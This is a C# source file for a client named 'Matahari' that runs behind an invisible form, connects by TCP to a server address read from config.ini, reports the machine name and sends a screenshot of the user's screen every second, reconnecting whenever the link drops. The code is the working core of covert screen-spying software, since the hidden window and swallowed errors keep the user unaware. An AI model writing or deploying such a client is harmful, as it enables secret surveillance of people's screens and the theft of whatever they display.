using IniFile;
using System.Net;
using System.Net.Sockets;

namespace Matahari
{
    internal static class MatahariClient
    {
        private static string address = string.Empty;
        private static int port;

        [STAThread]
        static void Main()
        {
            // Read configuration data and check if complete
            if (!ReadConfiguration())
            {
                return;
            }

            // Start network client
            Task.Run(() => RunClient());

            // Initialize invisible form
            ApplicationConfiguration.Initialize();
            Application.Run(new HiddenForm());
        }

        private static bool ReadConfiguration()
        {
            Ini configuration = new("config.ini");
            string? message = null;

            try
            {
                if (!configuration.Contains("Server"))
                {
                    throw new Exception("server information missing");
                }

                address = configuration["Server"]["Address"];
                port = configuration["Server"]["Port"];
            }
            catch (Exception e)
            {
                message = e.Message;
            }

            if (message != null)
            {
                MessageBox.Show("Configuration invalid. (" + message + ")", "matahari", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        private static void RunClient()
        {
            IPEndPoint endPoint = new(IPAddress.Parse(address), port);
            Socket socket = new(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            while (!socket.Connected)
            {
                try
                {
                    socket.Connect(endPoint);
                }
                catch { }
            }

            // Send LoginPacket as soon as connection is established
            NetworkStream stream = new(socket, true);
            PacketUtility.WritePacket(stream, new LoginPacket(Environment.MachineName));

            // As long as connection is up send heartbeat every second
            long lastHeartbeat = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
            while (socket.Connected)
            {
                long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

                if (now - lastHeartbeat >= 1000)
                {
                    try
                    {
                        Bitmap screenshot = new ScreenshotCreator().CreateScreenshot();
                        PacketUtility.WritePacket(stream, new HeartbeatPacket(screenshot));
                    }
                    catch { }

                    lastHeartbeat = now;
                }
            }

            RunClient();
        }
    }
}